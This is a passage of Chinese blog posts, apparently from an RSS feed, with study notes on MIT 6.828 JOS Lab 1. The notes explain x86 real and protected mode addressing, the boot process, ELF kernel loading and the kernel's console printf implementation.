段内偏移</span><br></pre></td></tr></table></figure><p>以上就是实模式访问内存地址的原理。</p><p><strong>保护模式</strong></p><p>随着CPU的发展，CPU的地址线的个数从原来的20根变成了现在的32根，所以可以访问的内存空间从1MB变成了现在的4GB，寄存器的位数也变成了32位。所以实模式下的内存地址计算方式就已经不再适合了。所以就引入了现在的保护模式，实现更大的空间，更灵活的内存访问。</p><p>在介绍保护模式的工作原理之前，先介绍几个容易混淆的概念。逻辑地址，虚拟地址，线性地址，物理地址。</p><p>我们都知道，如今在编写程序时，程序是运行在虚拟地址空间下的，也就是说，在程序员编写程序时指令中出现的地址并不一定是这个程序在内存中运行时真正要访问的内存地址。这样做的目的是为了能够让程序员在编程时不需要之间操作真实地址，并且如果能够之间操作物理地址，肯定是不安全的，因为当它在真实运行时，内存中各个程序的分布情况是不可能在编写程序时就知道的。所以这个程序的这条指令到底要访问哪个内存单元是由操作系统来确定的。所以这就是一个<strong>虚拟地址</strong>到真实主存中物理地址的转换。</p><p>那么<strong>逻辑地址</strong>又是什么呢？根据上面我们知道，程序员编写时看到的是虚拟地址，但是并不是说程序员直接把这个虚拟地址写道指令中的。它是由逻辑地址推导得到的。所以指令中真实出现的是逻辑地址，一个逻辑地址由两部分组成，一个是段选择子，一个是段内偏移。而且采用哪个段选择子通常也是在指令中隐含的，程序员通常只需要指明段内偏移量。然后分段管理机构会把逻辑地址转换为线性地址。如果该机器没用采用分页机制的话，此时的线性地址就是最后的主存物理地址。但是如果机器中还有分页设备的话，比如内存大小实际只有1G，但是根据前面我们知道可访问的空间有4G。所以此时还需要分页机构把线性地址转化为最终的真实物理地址。所以可见虚拟地址和线性地址的含义是差不多的。我们可以在下图中看到我们上面叙述的地址转换过程。在boot loader中，并没有分页机制。所以计算出来的线性地址就是真实要访问的主存地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072026781/0" alt="image-20210119215131791"></p><p>那么在保护模式下我们是如何最终的物理地址的呢？</p><p>首先，在计算机中存在两个表，GDT，LDT。它们两个其实是同类型的表，前者叫做全局段描述符表，后者叫做本地段描述符表。他们都是用来存放关于某个运行在内存中的程序的分段信息的。比如某个程序的代码段是从哪里开始的，有多大；数据段又是从哪里开始的，又多大。GDT表全局可见，也就是说每一个运行在内存中的程序都能看到这个表。所以操作系统内核程序的段信息就存在这里面。还有一个LDT表，这个表是每一个在内存中的程序都包含的，里面指明了每一个程序的段信息。我们可以看一下这两个表的结构，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072027516/0" alt="image-20210119215630208"></p><p>我们从图中可以看到，无论是GDT，还是LDT。每一个表项都包含三个字段：</p><ol><li>Base：32位，代表这个程序的这个段的基地址。</li><li>Limit：20位，代表这个程序的这个段的大小。</li><li>Flags：12位，代表这个程序的这个段的访问权限。</li></ol><p>当程序中给出逻辑地址（segment：offset）时，它不像实模式那样，用segment的值做段基址。而是把这个segment的值作为一个selector，代表这个段的段表项在GDT/LDT表的索引。比如你要访问的地址是segment：offset = 0x01：0x0000ffff，此时由于每个段表项的长度位8，所以应该取出地址8（索引为1）处的段表项。然后首先根据Flags字段来判断是否可以访问这个段的内容，这样做是为了能够实现进程间地址的保护。如果能够访问，则把Base字段的内容取出，直接与offset相加，就得到线性地址了。之后就是要根据是否有分页机制来进行地址转换了。</p><p>比如当前Base字段的值是0x00f0000，则最后线性地址的值为0x00fffff。</p><p>以上就是保护模式下内存地址的计算方法。</p><p>综上，通过上面的叙述可见，保护模式要比实模式灵活许多：</p><ol><li>实模式下段基址必须是16的整数倍，保护模式下段基址可以是4GB空间内的任意一个地址。</li><li>实模式下段的长度为65536，但是保护模式下段的长度也是可以达到4GB的。</li><li>保护模式下可以对内存的访问多加一层保护，但是实模式没有。</li></ol>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab1【未完】</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/</guid>
      <pubDate>Fri, 22 Jan 2021 08:41:44 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Part-1-PC-Bootstrap&quot;&gt;&lt;a href=&quot;#Part-1-PC-Bootstrap&quot; class=&quot;headerlink&quot; title=&quot;Part 1: PC Bootstrap&quot;&gt;&lt;/a&gt;Part 1: PC Bootstrap&lt;/h2&gt;&lt;h3
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h3><p>这一节我们深入探讨PC到底是如何启动的。首先看下通常一个PC的物理地址空间是如何布局：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB) </span><br><span class="line">|      32-bit      | </span><br><span class="line">|  memory mapped   | </span><br><span class="line">|     devices      | </span><br><span class="line">|                  | </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">|                  | </span><br><span class="line">|      Unused      | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- depends on amount of RAM </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">| Extended Memory  | </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB) </span><br><span class="line">|     BIOS ROM     | </span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB) </span><br><span class="line">|  16-bit devices, | </span><br><span class="line">|  expansion ROMs  | </span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB) </span><br><span class="line">|   VGA Display    | </span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB) </span><br><span class="line">|                  | </span><br><span class="line">|    Low Memory    | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><p>这张图仅仅展示了内存空间的一部分。</p><p>第一代PC处理器是16位字长的Inter 8088处理器，这类处理器只能访问1MB的内存空间。早期的PC的物理地址空间是从<code>0x00000000</code>开始，但从<code>0x000FFFFF</code>而不是<code>0xFFFFFFFF</code>结束，即<code>0x00000000 ~ 0x000FFFFF</code>。但是这1MB的空间也不是用户都能利用到的，只有低640KB（<code>0x00000000 ~ 0x000A0000</code>）的地址空间是用户程序可以使用的。即只有标记位 “Low Memory”的640KB空间是早期的PC唯一可以使用的随机存器存储器（RAM）。如图所示。</p><p>而剩下的384KB（<code>0x000A0000 ~ 0x000FFFFF</code>）的高地址空间则被保留用作其他的目的，比如（<code>0x000A0000 ~ 0x000C0000</code>）被用作屏幕显示内容缓冲区，其他的则被非易失性存储器（ROM）所使用。其中最重要的一部分就是基本输入/输出系统（BIOS），占据了<code>0x000F0000 ~ 0x00100000</code> 的地址空间。BIOS负责进行一些基本的系统初始化任务，比如开启显卡，检测该系统的内存大小等等工作。在初始化完成后，BIOS就会从某个适当的地方（比如软盘，硬盘，CD-ROM或者网络）加载操作系统，并将计算机的控制权交给操作系统。</p><p>虽然Inter处理器突破了1MB内存空间，在80286和80386上已经实现了16MB，4GB的地址空间，但是PC的架构必须仍旧把原来的1MB的地址空间的结构保留下来，这样才能实现向后兼容。所以现代计算机的地址<code>0x000A0000 ~ 0x00100000</code>区间是一个空洞，不会被使用。因此这个空洞就把地址空间划分成了两部分，第一部分就是从<code>0x00000000 ~ 0x000A0000</code>，叫做传统内存。剩下的不包括空洞的其他部分叫做扩展内存。而对于这种32位字长处理器通常把BIOS存放到整个存储空间的顶端处。</p><p>由于xv6操作系统设计的一些限制，它只利用256MB的物理地址空间，即它假设用户的主机只有256MB的内存。</p><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>现在我们利用qemu和gdb去探索PC机的启动过程。首先看一下如何利用这两个软件来实现对操作系统的debug。</p><p>首先我们在lab目录下打开终端输入 <code>make qemu-gdb</code> 后，再打开一个终端输入 <code>make gdb</code> 显示如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13071972822/0" alt="image-20210119162235532"></p><p>这样其实我们就可以开始调试了<del>~</del> 芜湖！</p><p>我们可以看到下面那一行：</p><p><code>[f000:fff0]  0xffff0: ljmp  $0xf000, $0xe05b</code></p><p>这条指令就是整个PC加电启动后，执行BIOS的第一条指令。</p><ul><li>PC从物理地址0x000ffff0开始执行，该地址位于ROM BIOS保留的64KB区域的最顶部。</li><li>PC从CS = 0xf000 和 IP = 0xfff0 开始执行。</li><li>要执行的第一条指令是跳转指令，它跳转到CS = 0xf000 和 IP = 0xe05b 开始执行。</li></ul><p>为什么QEMU要这样启动或者说PC启动是这样的。因为PC中的BIOS是”硬连线”到物理地址范围<code>0x000f0000 ~ 0x000fffff</code>，也就是说这是一种硬性的规定，在加电后就是必须且一定在0x000ffff0这个地方开始执行BIOS的第一条指令，即加电后CS = 0xf000 ，IP = 0xfff0。这样设计可以确保BIOS在加电或任何系统重新启动后始终首先控制计算机，至于为什么我们稍后了解。</p><p>QEMU带有自己的BIOS，它将其放置在处理器的模拟物理地址空间中的此位置，处理器复位后，此时进入实模式，并将CS设置为0xf000，将IP设置为0xfff0，以便从该段（CS:IP）开始执行。那么逻辑地址<code>0xf000：0xfff0</code> 是如何变成物理地址的？</p><p>实模式下的地址转换公式为：<code>16 * segment + offset</code></p><p>也就是 <code>0xf000 * 16  + 0xfff0 = 0x000ffff0</code></p><p>这里我们发现其实0xffff0与BOIS的结尾处0x100000只相差了16个字节，所以这里所作的第一件事就是jmp到BIOS中的较前的位置，毕竟仅仅16字节能完成多少工作？</p><p>综上，我们可以知道BIOS的操作就是在控制，初始化，检测各种底层的设备，比如时钟，GDTR寄存器，以及设置中断向量表等等。作为PC通电后运行的第一段程序，<strong>它最重要的功能是把操作系统从磁盘中导入内存，然后再把控制器交给操作系统。</strong>所以BIOS在运行的最后会去检测可以从当前系统的哪个设备中找到操作系统，通常来说是我们的磁盘，也有可能是U盘等等。等BIOS确定了，操作系统位于磁盘中，那么它就会把这个磁盘的第一个扇区，通常把它叫做启动区（boot sector）先加载到内存中，这个启动区中包括一个非常重要的程序 —– boot loader，它会负责完成整个操作系统从磁盘导入内存的工作，以及一些其他的非常重要的配置工作。最后操作系统才会开始运行。</p><p>所以PC启动后的运行顺序是 ：BIOS -&gt; boot loader -&gt; 操作系统内核</p><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>PC的硬盘和软盘都可以划分一个个大小为512字节的区域，叫做扇区。一个扇区是一次磁盘操作的最小粒度。每一次读取或者写入操作都必须是一个或多个扇区。如果一个磁盘是可以被用来启动操作系统的，就把这个磁盘的第一个扇区叫做启动扇区。这一部分介绍的boot loader程序就位于这个启动扇区中。当BIOS找到一个可以启动的软盘或硬盘后，它就会把这512字节的启动扇区加载到内存地址<code>0x7c00 ~ 0x7dff</code>这个区域内，然后BIOS将CPU的控制权交给boot loader。</p><p>对于我们的课程6.828，我们将采用传统的硬盘启动机制，这就意味着我们的boot loader的大小必须小于512字节。整个boot loader是由一个汇编文件（<code>boot/boot.S</code>）以及一个C语言文件（<code>boot/main.c</code>）。boot loader必须完成两个主要的任务。</p><ol><li>首先，boot loader把处理器从实模式转换为32bit的保护模式，只有在这种模式下软件可以访问超过1MB空间的内容。</li><li>boot loader可以通过使用x86的特定的IO指令，直接访问IDE磁盘设备存储器，从磁盘读取内核。</li></ol><p>简单概括就是进保护模式，然后读内核。对于boot loader来说，有一个文件很重要（<code>obj/boot/boot.asm</code>）。这个文件是我们真实运行的boot loader程序的反汇编版本。所以我们可以把它和它的源代码即<code>boot.S</code>和<code>main.c</code>比较一下。</p><p>此处出门右转Lab1-Exercise3</p><p>回答下文章内提出的四个问题：</p><ol><li><p><strong>处理器是在上面时候开始运行于32bit模式？到底是什么把CPU从16位切换为32位工作模式？</strong></p><p>在boot.S文件中，计算机首先工作于实模式，此时是16bit工作模式。当运行完<code>ljmp    $PROT_MODE_CSEG, $protcseg</code>这条语句后，正式进入32位工作模式。</p></li><li><p><strong>boot loader中执行的最后一条语句是什么？内核被加载到内存中执行的第一条语句又是什么？</strong></p><p>boot loader执行的最后一条语句是bootmain子程序中的最后一条语句<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>，也就是跳转到操作系统内核文件的第一条指令的起始虚拟地址处。第一条指令位于/kern/entry.S文件中，第一句是<code>movw   $0x1234,0x472</code></p></li><li><p><strong>内核的第一条指令在哪里？</strong></p><p>位于/kern/entry.S中</p></li><li><p><strong>boot loader是如何知道它要读取多少个扇区才能把整个内核都送入内存的呢？在哪里找到这些信息？</strong></p><p>首先关于操作系统一共有多少个段，每个段又有多少个扇区的信息位于操作系统文件中的Program Header Table中。这个表中的每个表项分别对应操作系统的一个段。并且每个表项的内容包括这个段的大小，段起始地址偏移等等信息。所以如果我们能够找到这个表，那么就能够通过表项所提供的信息来确定内核占用的扇区。在操作系统内核映像文件的ELF头部信息中。</p></li></ol><h3 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h3><p>现在我们进一步讨论一下boot loader中的C部分。为了能够理解boot/main.c程序，你必须首先清楚什么是ELF文件。当在编译并且链接了像JOS内核这样的C语言程序后，编译器会把C语言源文件（.c后缀）转换为目标文件（.o后缀）。目标文件中包含的是机器能够直接执行的机器指令。链接器在把所有的目标文件组合成一个单独的二进制映像，比如obj/kern/kernel。这类二进制映像文件就是ELF格式的。</p><p>在6.828中，可以认为一个可执行的ELF文件由三大部分组成：一个是带有加载信息的文件头，然后紧跟着程序段表，然后紧跟着就是几个程序段。其中每一个段都是一块连续的代码或数据。它们在被运行时要首先加载到内存中。boot loader的工作就是把它们加载到内存中。</p><p>一个ELF文件，开始处是一个固定长度的ELF文件头，后面紧跟着一个程序段表，这个段表中列出了要加载到内存的所有段。关于ELF文件头的格式在inc/elf.h文件中由声明。在6.828中我们对三个段非常感兴趣：</p><ul><li>.text段：存放所有可执行代码。</li><li>.rodata段：存放程序所有只读数据的数据段，比如字符串常量。</li><li>.data段：存放所有被初始化过的数据段，比如有初始值的全局变量。</li></ul><p>当链接器在计算整个程序的内存布局时，它会为未初始化的全局变量，比如int x，在一个紧跟在.data段后的段，.bss段中保留它们的信息。C语言要求所有没有被初始化的变量值为0。因而我们并不需要在ELF文件中存放这些变量的值，因为它们一定是0。因此链接器知识把这些变量的地址和大小存放在.bss段中。只有当程序装入内存后，由装入器为这些段赋予初值0。</p><p>我们可以通过下面的命令来查看JOS内核中所有段的名字，大小和地址</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -h kernel</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111778464/0" alt="image-20210131003630740"></p><p>在图中我们会发现这个可执行文件的所有段的信息，其中不仅仅包括我们之前提到的那四个段，还有一些其他的，它们主要用于存放一些debug信息等。</p><p>在每一个段中都有两个比较重要的字段，VMA（链接地址），LMA（加载地址）。其中加载地址代表的就是这个段被加载到内存中后，它所在物理地址。链接地址则指的是这个段希望被存放到的逻辑地址。</p><p>每一个ELF文件中都有一个Program Headers Table，用于指明ELF文件中哪些部分被加载到内存，以及被加载到内存中的地址。可以通过下面的指令获取kernel的Program Headers Table的信息：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -x obj/kern/kernel</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111796577/0" alt="image-20210131004606790"></p><p>其中Program Header中列出的是所有被加载在内存中的段的信息，这也是Program Headers Table的表项。每一个表项图中都把这个表项中涉及到的所有字段都列出来了。可见有一些段最后没有被加入到内存之中。上图中，那些需要被加载到内存的段被标记为LOAD。</p><p>BIOS通常会把boot sector加载到内存地址0x7c00处，这是boot sector的加载地址，也是boot sector的链接地址。我们可以通过boot/Makefrag文件中的-Ttext 0x7c00语句设置boot sector的链接地址，并且这个链接地址后来会被链接器所使用，保证链接器产生正确的代码。</p><p>再次回顾下内核的加载地址和链接地址。与boot loader不同，内核的这两个地址是不同的。内核告诉boot loader把它加载到低地址处（加载地址），但是它希望运行在高地址处（链接地址）。个人理解就是加载地址其实就是物理地址，物理地址大家都是唯一的，然后链接地址是虚拟地址，虚拟地址可以有相同，但是解析成最后的物理地址肯定是唯一的。我们在下一章细看这个问题。</p><p>除了各个段的信息，在ELF头部中，还有一个非常重要的信息就是e_entry字段。这个字段存放的是这个可执行程序的入口处的链接地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111833495/0" alt="image-20210131012003293"></p><p>可见内核程序的入口地址为0x0010000c，这个地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13111839005/0" alt="image-20210131012654935"></p><p>查看之前的e_entry字段，可以发现这个地址与我们查询的相同。</p><h2 id="Part-3-The-Kernel"><a href="#Part-3-The-Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><p>现在我们将具体谈论一下JOS内核。就像boot loader一样，内核开始的时候也是一些汇编语句，用于设置一些东西，来保证C程序能够正确执行。</p><h3 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h3><p>在运行boot lodaer时，boot loader的链接地址（虚拟地址）和加载地址（物理地址）是一样的。但是当进入内核程序后，这两种地址就不再相同了。</p><p>操作系统内核程序在虚拟地址空间通常会被链接到一个非常高的虚拟地址空间处，比如0xf0100000，目的就是能够让处理器的虚拟地址空间的低地址部分能够被用户利用来进行编程。</p><p>但是许多的机器其实并没有能够支持0xf0100000这种地址那么大的物理内存，所以我们不能把内核的0xf0100000虚拟地址映射到物理地址0xf0100000的存储单元处。</p><p>这就造成了一个问题，在我们编程时，我们应该把操作系统放在高地址处，但是在实际的计算机内存中却没有那么高的地址，这该怎么办？</p><p>解决方案就是在虚拟地址空间中，我们还是把操作系统放在高地址处0xf0100000，但是在实际的内存中我们把操作系统存放在一个低的物理地址空间中，如0x00100000。那么当用户程序向访问一个操作系统内核的指令时，首先给出的是一个高的虚拟地址，然后计算机中通过某个机构把这个虚拟地址映射为真实的物理地址，这就解决了上面的问题。那么这种机构通常就是通过分段管理，分页管理来实现的。</p><p>在实验中，首先是采用分页管理的方法来实现上面所讲述的地址映射。但是设计者实现的映射的方式并不是通常计算机所采用的分页管理机构，而是自己手写了一个程序<code>lab/kern/entrygdir.c</code>用于进行映射。既然是手写的，所以它的功能就很有限，只能够把虚拟地址空间的地址范围：<code>0xf0000000 ~ 0xf0400000</code>，映射到物理地址范围：<code>0x00000000 ~ 0x00400000</code>上面。也可以把虚拟地址范围：<code>0x00000000 ~ 0x00400000</code>，同样映射到物理地址范围：<code>0x00000000 ~ 0x00400000</code>上面。任何不再这两个虚拟地址范围内的地址都会引起一个硬件异常。虽然只能映射这两块很小的空间，但是已经足够刚启动程序的时候来使用了。</p><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p>我们经常会在编程时使用到printf子程序，这个子程序是在操作系统的内核中实现的。这一小部分就是要探究一下这种格式化输出子程序的实现方式。</p><p>通读kern/printf.c，lib/printfmt.c和kern/console.c三个C语言程序，并且确保你能够理解他们之间的关系。在后边的实验中我们会弄清楚为什么printfmt.c子程序会放在lib文件夹下。</p><p>回答下Exercise 8后面的问题：</p><ol><li><p>解释一下printf.c和console.c两个之间的关系。console.c输出了哪些子函数？这些函数是怎么被printf.c所利用的。</p><p>在exercise8的解答中我们知道了，console.c中除了被static修饰符修饰的函数外，都可以被外部所使用，其中printf所使用的函数就是cputchar子函数。</p></li><li><p>解释一下console.c文件中，下面这段代码的含义：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>      <span class="keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;</span><br><span class="line"><span class="number">2</span>              <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">3</span>              memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>));</span><br><span class="line"><span class="number">4</span>              <span class="keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)</span><br><span class="line"><span class="number">5</span>                      crt_buf[i] = <span class="number">0x0700</span> | <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="number">6</span>              crt_pos -= CRT_COLS;</span><br><span class="line"><span class="number">7</span>      &#125;</span><br></pre></td></tr></table></figure><p>首先下一下几个变量。</p><p><code>crt_buf</code>：这是一个字符数组缓冲区，里面存放着要显示到屏幕上的字符。</p><p><code>crt_pos</code>：这个表示当前最后一个字符显示在屏幕上的位置。在介绍这个变量前，我们要知道早期的计算机如果想显示信息给用户只能通过文字模式。那么这个console.c源程序中考虑的就是一种非常常见的文字模式，80x25文字模式，即整个屏幕上允许显示最多25行字符，每行最多显示80个字符。所以一共代表了80x25个位置。当我们要显示某个特定字符到屏幕某个位置上面时，我们必须要指定显示的位置，和显示字符给屏幕驱动器cga。</p><p>而cga_putc（int c）就是完成这项功能，把字符c显示到屏幕当前显示的下一个位置。比如当前屏幕中已经显示了三行数据，并且第三行已经显示了40个字符，此时执行cga_puta（0x65），那么就会把0x65对应的字符’A’显示到2行第41个字符处。所以cga_putc需要两个变量，crt_buf，这个字符数组指针，该字符</p><p>数组就是当前显示在屏幕上的所有字符。crt_pos则表示下一个要显示的字符存放在数组中的位置，其实通过这个值也可以推导出它显示在屏幕上的位置。比如crt_pos = 85，那么它就应该显示在第2行（即1号行），第6字符（5号字符）处。所以crt_pos的取值范围应该是从0~(80*25-1)。</p><p>当crt_pos &gt;= CRT_SIZE，其中CRT_SIZE=80*25，由于我们知道crt_pos取值范围是0 <del>（80 * 25 - 1），那么这个条件如果成立则说明现在在屏幕上输出的内容已经超过了一页。所以此时要把页面向上滚动一行。所以memmove操作就是把crt_buf字符数组中1</del>79行的内容复制到0~78行的位置上，for循环就是把最后一行都变成空格，当然第0号要显示输入的字符c，最后修改crt_pos的值。</p></li><li><p>观察下面的一串代码，回答下面问题：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>, y = <span class="number">3</span>, z = <span class="number">4</span>;</span><br><span class="line">cprintf(<span class="string">&quot;x %d, y %x, z %d\n&quot;</span>, x, y, z);</span><br></pre></td></tr></table></figure><ul><li>当调用cprintf时，fmt指向的是什么内容，ap指向的是什么内容。</li><li>按照执行的顺序列出所有对cons_putc, va_arg，和vcprintf的调用。对于cons_putc，列出它所有的输入参数。对于va_arg列出ap在执行完这个函数后的和执行之前的变化。对于vcprintf列出它的两个输入参数的值。</li></ul><p>fmt指向显示信息的格式字符串，那么在这段代码中，它指向的就是”x %d, y %x, z %d\n”字符串，而ap是va_list类型的，所以指向所有输入参数的集合。我们发现cprintf调用了vcprintf函数，并且把格式字符串fmt，以及所有的参数列表ap（包含x，y，z）作为输入参数传给了vcprintf，然后vcprintf调用了vprintfmt子程序，并且传递给它4个参数。第一个参数是显示字符的子程序：这里采用的是printf.c文件中自己定义的putch函数。这个函数可以把字符显示到屏幕上。然后在传递一个值为0的变量的引用给第2个参数。原本第2个参数的含义是一个内存地址，并且第1个参数函数指针所指向的函数应该能够把字符写入到第2个参数所指定的地址处。但是由于我们的第1个参数是显示数据到屏幕。所以这里不需要第2个参数了。所以此时我们把一个变量引用作为第2个参数，是把它当做计数器，记录显示了多少字符。第3,4字符的含义没有变，和cprintf的参数一样。</p><p>然后进入vprintfmt子程序。这个子程序我们已经分析过。这里就不再赘述了。这个子程序的工作过程就是，不停的分析格式字符串fmt。分析采取的方式是把格式字符串划分成多个部分，每个部分都至多带有一个待显示的参数，比如我们这道题中的格式字符串就可以被划分为4个部分：”x %d”， “, y %x” , “, z %d”, “\n”。</p><p>然后先分析每个部分中%号前面的字符串，并且直接输出。比如”x %d”中”x “。然后分析%号后面的内容，比如”x %d”中分析的结果就是要按照10进制显示一个参数。每当分析完%号后面的内容，程序就会按照分析的结果来进行不同的操作。在分析完”x %d”后，代码开始执行下面这个分支：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">   num = getint(&amp;ap, lflag); <span class="comment">//根据你的整数类型到底是int，还是long，还是long long，从参数列表ap中取出相应类型的参数</span></span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">long</span> <span class="keyword">long</span>) num &lt; <span class="number">0</span>) &#123; <span class="comment">//如果输入参数是负数，先输出一个负号</span></span><br><span class="line">      putch(<span class="string">&#x27;-&#x27;</span>, putdat);</span><br><span class="line">      num = -(<span class="keyword">long</span> <span class="keyword">long</span>) num;</span><br><span class="line">   &#125;</span><br><span class="line">   base = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure><p>这个分支首先是一个子函数getint，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span></span><br><span class="line">getint(va_list *ap, <span class="keyword">int</span> lflag)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">if</span> (lflag &gt;= <span class="number">2</span>)</span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (lflag)</span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">long</span>);</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> va_arg(*ap, <span class="keyword">int</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见它根据不同的参数类型，利用va_arg方法从ap参数列表中取出下一个参数，在我们的例子中会执行<code>return va_arg(*ap, int)</code>。这里对va_arg进行了一次调用，调用前ap中包括x，y，z三个参数的内容：1，3，4。调用完剩下3，4。</p><p>回到vprintfmt，现在num中存放的是待显示的值1。下一步判断这个值是否为负数，如果是负数，先调用putch显示一个负数在屏幕上。然后跳转到number处。</p><p>number处是一个子程序 printnum(putch, putdat, num, base, width, padc)，这个子程序会按照指定的进制，以及格式显示你刚刚取到的参数1。在这个子程序中我们可以看到它会把你取到的参数值（num = 1）按照你所指定的进制（base = 10），一位一位的显示出来。所以每得到一位的值它都会调用一次putch，把它显示到屏幕上。另外这句代码putch(padc, putdat);是为了实现当显示需要右对齐时，应该先把左边补上空格。所以这样第1个参数x=1就是显示在屏幕上了，后面的两个也是同样的道理。</p></li><li><p>运行下面的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0x00646c72</span>;</span><br><span class="line">cprintf(<span class="string">&quot;H%x Wo%s&quot;</span>, <span class="number">57616</span>, &amp;i);</span><br></pre></td></tr></table></figure><p>输出是什么？为什么是这样的输出？</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13127955181/0" alt="image-20210203170947538"></p><p>为什么会这样，首先我们看下第一个%x，指的是按照16进制输出第一个参数，第一个参数的值是57616，它对应的16进制的表示形式为e110，所以前面就变成了He110。然后看下一个%s，输出参数所指向的字符串，参数是&amp;i，是变量i的地址，所以应该输出的是变量i所在地址处的字符串。而在cprintf之前我们把i定义为一个int类型变量，所以现在我们要把它们进行拆分，按照一个字节一个字节来进行输出。</p><p>由于x86是小端模式，代表字的最高位字节存放在最高位字节地址上。假设i变量的地址为0x00，那么i的4个字节的值存放在0x00，0x01，0x02，0x03四处。由于是小端存储，所以0x00处存放0x72(‘r’)，0x01处存放0x6c(‘l’)，0x02处存放0x64(‘d’)，0x03处存放0x00(‘\0’)。</p><p>所以在cprintf将会从i的地址开始一个字节一个字节遍历，正好输出 “World</p></li><li><p>看下面代码，在’y=’后面会输出什么，为什么会这样</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cprintf(<span class="string">&quot;x=%d y=%d&quot;</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>结果如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13127981014/0" alt="image-20210203171441302"></p><p>由于y没有参数被指定，会是输出一个不确定的值。</p></li></ol><h3 id="The-Stack"><a href="#The-Stack" class="headerlink" title="The Stack"></a>The Stack</h3><p>在本实验的最后一部分，我们将探讨一下C语言是如何在x86机器上使用堆栈的。并且我们还会重新编写一个新的kernel 